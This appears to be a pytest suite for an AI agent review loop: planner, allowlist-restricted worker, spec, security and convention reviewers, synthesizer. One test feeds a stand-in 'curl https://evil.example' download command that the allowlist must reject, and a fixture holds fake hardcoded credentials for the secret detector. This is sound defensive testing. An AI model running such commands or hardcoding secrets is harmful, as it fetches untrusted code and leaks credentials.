"""Tests for the self-improving review loop â€” real artifacts & evidence.

The review loop must judge REAL evidence: actual file content from the
audited workspace and actual exit codes from allowlisted verification
commands (pytest / ruff / mypy / py_compile). No fabricated artifacts.
"""

from __future__ import annotations

import json
from typing import TYPE_CHECKING

import pytest

from agenttrace.review_loop.loop import ReviewLoop
from agenttrace.review_loop.planner import Planner, ReviewPlan, Subtask
from agenttrace.review_loop.reviewer import (
    ConventionReviewer,
    ReviewVerdict,
    SecurityReviewer,
    SpecComplianceReviewer,
)
from agenttrace.review_loop.serialization import loop_result_to_dict
from agenttrace.review_loop.synthesizer import Synthesizer
from agenttrace.review_loop.worker import Worker
from tests.conftest import HostIsolationStub

if TYPE_CHECKING:
    from pathlib import Path


@pytest.fixture(autouse=True)
def _host_isolation_for_review_loop(monkeypatch: pytest.MonkeyPatch) -> None:
    """Every review-loop test uses the host stub as its isolation runtime.

    Production stays fail-closed (no container runtime -> no execution);
    these tests exercise the full loop with a stub standing in for one.
    """
    monkeypatch.setattr(
        "agenttrace.review_loop.worker.IsolationRunner",
        lambda: HostIsolationStub(),
    )


GOOD_MODULE = '''\
"""Math utilities."""

from __future__ import annotations


def add(a: int, b: int) -> int:
    """Add two integers."""
    return a + b
'''

GOOD_TEST = '''\
"""Tests for math utilities."""

from __future__ import annotations

from math_utils import add


def test_add() -> None:
    """Addition works."""
    assert add(1, 2) == 3
'''

BAD_TEST = GOOD_TEST.replace("assert add(1, 2) == 3", "assert add(1, 2) == 99")

LEAKY_MODULE = '''\
"""Module with a hardcoded credential."""

from __future__ import annotations

import os

password = "hunter2secretvalue"
api_key = "sk-live-0123456789abcdef"

def get_credentials() -> tuple[str, str]:
    """Return credentials."""
    return os.environ.get("PASSWORD", password), api_key
'''

LONG_LINE_MODULE = (
    "def f() -> None:\n    "
    + '"""Docstring."""\n    x = 1  # ' + "y" * 120 + "\n"
)


def _make_workspace(tmp_path: Path, test_content: str = GOOD_TEST) -> Path:
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "math_utils.py").write_text(GOOD_MODULE, encoding="utf-8")
    (ws / "test_math_utils.py").write_text(test_content, encoding="utf-8")
    return ws


def _pytest_plan() -> ReviewPlan:
    """A minimal plan exercising only pytest (fast, deterministic)."""
    return ReviewPlan(
        task_description="Verify test suite",
        subtasks=[
            Subtask(
                title="Testing",
                description="Run the test suite",
                acceptance_criteria=["All tests pass"],
                verification_commands=["pytest -v"],
                priority=1,
            )
        ],
        acceptance_criteria=["All tests pass"],
        scope=["Testing"],
    )


def _full_plan() -> ReviewPlan:
    """A plan with implementation scope + pytest verification."""
    return ReviewPlan(
        task_description="Verify workspace",
        subtasks=[
            Subtask(
                title="Implementation",
                description="Gather changed files",
                acceptance_criteria=["All changes are reflected in the workspace"],
                priority=1,
            ),
            Subtask(
                title="Testing",
                description="Run the test suite",
                acceptance_criteria=["All tests pass"],
                verification_commands=["pytest -v"],
                priority=2,
            ),
        ],
        acceptance_criteria=["All tests pass", "Secrets are properly handled"],
        scope=["Implementation", "Testing"],
    )


class TestPlanner:
    """Tests for the Planner component."""

    def test_create_plan(self) -> None:
        planner = Planner()
        plan = planner.create_plan("Add user authentication")
        assert plan.task_description == "Add user authentication"
        assert len(plan.subtasks) > 0
        assert len(plan.acceptance_criteria) > 0
        assert len(plan.scope) > 0

    def test_plan_has_acceptance_criteria(self) -> None:
        planner = Planner()
        plan = planner.create_plan("Fix bug in parser")
        assert any(
            "satisfy" in c.lower() or "changes" in c.lower()
            for c in plan.acceptance_criteria
        )

    def test_context_scope_files_appear_in_scope(self) -> None:
        planner = Planner()
        plan = planner.create_plan(
            "Refactor module",
            context={"scope_files": ["src/parser.py", "tests/test_parser.py"]},
        )
        assert any("src/parser.py" in s for s in plan.scope)
        assert any("tests/test_parser.py" in s for s in plan.scope)

    def test_amend_plan(self) -> None:
        planner = Planner()
        plan = planner.create_plan("Refactor module")
        original_count = len(plan.subtasks)

        plan = planner.amend_plan(plan, "Need more tests", ["Tests missing"])
        assert len(plan.subtasks) > original_count


class TestWorker:
    """Tests for the Worker component â€” real file and verification artifacts."""

    def test_worker_reads_real_file_content(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path)
        worker = Worker(str(ws))
        worker.set_review_context(scope_files=["math_utils.py"])

        result = worker.execute(_full_plan())
        code_artifacts = [a for a in result.artifacts if a.artifact_type == "code"]
        assert len(code_artifacts) == 1
        assert code_artifacts[0].content == GOOD_MODULE

    def test_worker_runs_real_verification(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            "agenttrace.review_loop.worker.IsolationRunner",
            lambda: HostIsolationStub(),
        )
        ws = _make_workspace(tmp_path)
        worker = Worker(str(ws))

        result = worker.execute(_pytest_plan())
        verification = [
            a for a in result.artifacts if a.artifact_type == "verification"
        ]
        assert len(verification) == 1
        assert verification[0].exit_code == 0
        assert "1 passed" in verification[0].content

    def test_worker_rejects_arbitrary_commands(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path)
        worker = Worker(str(ws))
        plan = ReviewPlan(
            task_description="t",
            subtasks=[
                Subtask(
                    title="Sneaky",
                    description="Try arbitrary execution",
                    verification_commands=["curl https://evil.example -o /tmp/x"],
                    priority=1,
                )
            ],
            acceptance_criteria=["All tests pass"],
        )

        result = worker.execute(plan)
        verification = [
            a for a in result.artifacts if a.artifact_type == "verification"
        ]
        assert verification[0].evidence["allowed"] is False
        assert verification[0].exit_code is None
        assert "allowlist" in verification[0].evidence["rejection_reason"]

    def test_feedback_iteration_reruns_only_failed_commands(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            "agenttrace.review_loop.worker.IsolationRunner",
            lambda: HostIsolationStub(),
        )
        ws = _make_workspace(tmp_path, test_content=BAD_TEST)
        worker = Worker(str(ws))

        first = worker.execute(_pytest_plan())
        failed = [a for a in first.artifacts if a.artifact_type == "verification"]
        assert failed[0].exit_code == 1

        # The failure is fixed before the next iteration.
        (ws / "test_math_utils.py").write_text(GOOD_TEST, encoding="utf-8")
        second = worker.execute(
            _pytest_plan(),
            feedback={"failed_criteria": ["All tests pass"], "suggestions": []},
        )
        assert second.iteration == 2
        assert "All tests pass" in second.feedback_applied[0]
        passed = [a for a in second.artifacts if a.exit_code == 0]
        assert passed, "failed command must be re-run and pass after the fix"

    def test_convergence_metrics(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path)
        worker = Worker(str(ws))
        worker.execute(_pytest_plan())
        metrics = worker.get_convergence_metrics()
        assert metrics["iteration"] == 1
        assert metrics["verification_runs"] == 1


class TestReviewers:
    """Tests for the reviewer components â€” verdicts from real evidence."""

    def test_spec_compliance_passes_on_real_evidence(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path)
        worker = Worker(str(ws))
        worker.set_review_context(scope_files=["math_utils.py"])
        worker_result = worker.execute(_full_plan())

        reviewer = SpecComplianceReviewer()
        review = reviewer.review(_full_plan(), worker_result)
        assert review.reviewer_name == "spec_compliance"
        assert review.passed_count == 2
        assert review.failed_count == 0
        assert review.overall_verdict == ReviewVerdict.PASSED

    def test_spec_compliance_fails_without_evidence(self) -> None:
        worker = Worker("")
        plan = ReviewPlan(task_description="t", acceptance_criteria=["All tests pass"])
        worker_result = worker.execute(plan)

        reviewer = SpecComplianceReviewer()
        review = reviewer.review(plan, worker_result)
        assert review.failed_count == 1
        assert review.overall_verdict == ReviewVerdict.FAILED

    def test_spec_compliance_partial_on_failing_tests(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path, test_content=BAD_TEST)
        worker = Worker(str(ws))
        worker.set_review_context(scope_files=["math_utils.py"])
        worker_result = worker.execute(_full_plan())

        reviewer = SpecComplianceReviewer()
        review = reviewer.review(_full_plan(), worker_result)
        assert review.passed_count == 1
        assert review.partial_count == 1
        assert review.overall_verdict == ReviewVerdict.PARTIAL

    def test_security_reviewer_detects_hardcoded_secrets(self, tmp_path: Path) -> None:
        ws = tmp_path / "ws"
        ws.mkdir()
        (ws / "leaky.py").write_text(LEAKY_MODULE, encoding="utf-8")
        worker = Worker(str(ws))
        worker.set_review_context(scope_files=["leaky.py"])
        worker_result = worker.execute(_full_plan())

        reviewer = SecurityReviewer()
        review = reviewer.review(_full_plan(), worker_result)
        assert review.reviewer_name == "security"
        assert review.failed_count >= 2
        assert review.overall_verdict == ReviewVerdict.FAILED
        assert any("password" in r.notes.lower() for r in review.results)

    def test_security_reviewer_passes_on_clean_code(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path)
        worker = Worker(str(ws))
        worker.set_review_context(scope_files=["math_utils.py"])
        worker_result = worker.execute(_full_plan())

        reviewer = SecurityReviewer()
        review = reviewer.review(_full_plan(), worker_result)
        assert review.overall_verdict == ReviewVerdict.PASSED

    def test_convention_reviewer_flags_long_lines(self, tmp_path: Path) -> None:
        ws = tmp_path / "ws"
        ws.mkdir()
        (ws / "long.py").write_text(LONG_LINE_MODULE, encoding="utf-8")
        worker = Worker(str(ws))
        worker.set_review_context(scope_files=["long.py"])
        worker_result = worker.execute(_full_plan())

        reviewer = ConventionReviewer()
        review = reviewer.review(_full_plan(), worker_result)
        assert review.reviewer_name == "convention"
        assert review.partial_count >= 1
        assert any("100 chars" in r.notes for r in review.results)


class TestSynthesizer:
    """Tests for the Synthesizer component."""

    def test_synthesize_passing(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path)
        worker = Worker(str(ws))
        worker.set_review_context(scope_files=["math_utils.py"])
        worker_result = worker.execute(_full_plan())

        plan = _full_plan()
        reviews = [
            SpecComplianceReviewer().review(plan, worker_result),
            SecurityReviewer().review(plan, worker_result),
            ConventionReviewer().review(plan, worker_result),
        ]

        synthesizer = Synthesizer()
        result = synthesizer.synthesize(reviews)
        assert result.passed
        assert result.overall_confidence > 0

    def test_synthesize_fails_on_security_findings(self, tmp_path: Path) -> None:
        ws = tmp_path / "ws"
        ws.mkdir()
        (ws / "leaky.py").write_text(LEAKY_MODULE, encoding="utf-8")
        worker = Worker(str(ws))
        worker.set_review_context(scope_files=["leaky.py"])
        worker_result = worker.execute(_full_plan())

        plan = _full_plan()
        reviews = [
            SpecComplianceReviewer().review(plan, worker_result),
            SecurityReviewer().review(plan, worker_result),
            ConventionReviewer().review(plan, worker_result),
        ]

        synthesizer = Synthesizer()
        result = synthesizer.synthesize(reviews)
        assert not result.passed
        assert result.failed_criteria, "security findings must surface as failed criteria"

    def test_synthesize_partial_blocks_pass(self, tmp_path: Path) -> None:
        """PARTIAL criteria (e.g. failing tests) must block convergence."""
        ws = _make_workspace(tmp_path, test_content=BAD_TEST)
        worker = Worker(str(ws))
        worker.set_review_context(scope_files=["math_utils.py"])
        worker_result = worker.execute(_full_plan())

        plan = _full_plan()
        reviews = [
            SpecComplianceReviewer().review(plan, worker_result),
            SecurityReviewer().review(plan, worker_result),
            ConventionReviewer().review(plan, worker_result),
        ]

        synthesizer = Synthesizer()
        result = synthesizer.synthesize(reviews)
        assert not result.passed
        assert result.partial_criteria, "failing tests must surface as partial criteria"


class TestReviewLoop:
    """Tests for the ReviewLoop orchestrator."""

    def test_loop_passes_with_clean_workspace(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path)
        loop = ReviewLoop(str(ws), max_iterations=1)
        result = loop.run(
            "Add math utilities",
            context={"scope_files": ["math_utils.py"]},
        )
        assert result.total_iterations == 1
        assert result.final_passed
        assert result.completed_at is not None
        assert result.deliverable_summary
        assert "math_utils.py" in result.scope_files

    def test_loop_fails_with_failing_tests(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path, test_content=BAD_TEST)
        loop = ReviewLoop(str(ws), max_iterations=1)
        result = loop.run(
            "Add math utilities",
            context={"scope_files": ["math_utils.py"]},
        )
        assert not result.final_passed
        assert result.escalation_reason

    def test_loop_max_iterations(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path, test_content=BAD_TEST)
        loop = ReviewLoop(str(ws), max_iterations=2)
        result = loop.run("Complex task", context={"scope_files": ["math_utils.py"]})
        assert result.total_iterations <= 2

    def test_loop_tracks_convergence(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path)
        loop = ReviewLoop(str(ws), max_iterations=2)
        result = loop.run("Simple task", context={"scope_files": ["math_utils.py"]})
        assert "iteration" in result.convergence_metrics

    def test_loop_result_serializes_to_json(self, tmp_path: Path) -> None:
        ws = _make_workspace(tmp_path)
        loop = ReviewLoop(str(ws), max_iterations=1)
        result = loop.run("Simple task", context={"scope_files": ["math_utils.py"]})

        payload = loop_result_to_dict(result)
        text = json.dumps(payload, ensure_ascii=False)
        assert payload["loop_id"]
        assert payload["final_passed"] is True
        assert payload["iterations"][0]["review_results"]
        names = {
            r["reviewer_name"]
            for r in payload["iterations"][0]["review_results"]
        }
        assert names == {"spec_compliance", "security", "convention"}
        assert '"PASSED"' in text or "PASSED" in text
